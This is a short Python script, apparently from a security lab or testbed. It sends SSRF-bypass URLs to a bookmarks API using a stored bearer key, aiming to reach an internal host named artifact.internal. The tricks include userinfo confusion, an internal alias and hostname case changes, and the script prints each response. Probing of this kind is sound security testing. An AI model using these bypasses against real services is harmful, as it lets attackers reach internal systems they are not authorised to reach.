import json,urllib.request,time
base='http://target-service:3000/api/v1/bookmarks'
key=json.load(open('/testbed/key-response.json'))['result']['data']['json']['key']
probes=[('userinfo','http://mysite.public:8080@artifact.internal:9000/'),('userinfo-reverse','http://artifact.internal:9000@mysite.public:8080/'),('port80','http://artifact.internal/'),('origin-alias','http://origin:8080/'),('case-host','http://ARTIFACT.INTERNAL:9000/')]
for label,url in probes:
 req=urllib.request.Request(base,data=json.dumps({'type':'link','url':url}).encode(),headers={'Authorization':'Bearer '+key,'Content-Type':'application/json'})
 try:
  with urllib.request.urlopen(req,timeout=5) as r: print(label,url,r.status,json.load(r)['id'],flush=True)
 except Exception as e:print(label,url,str(e),flush=True)
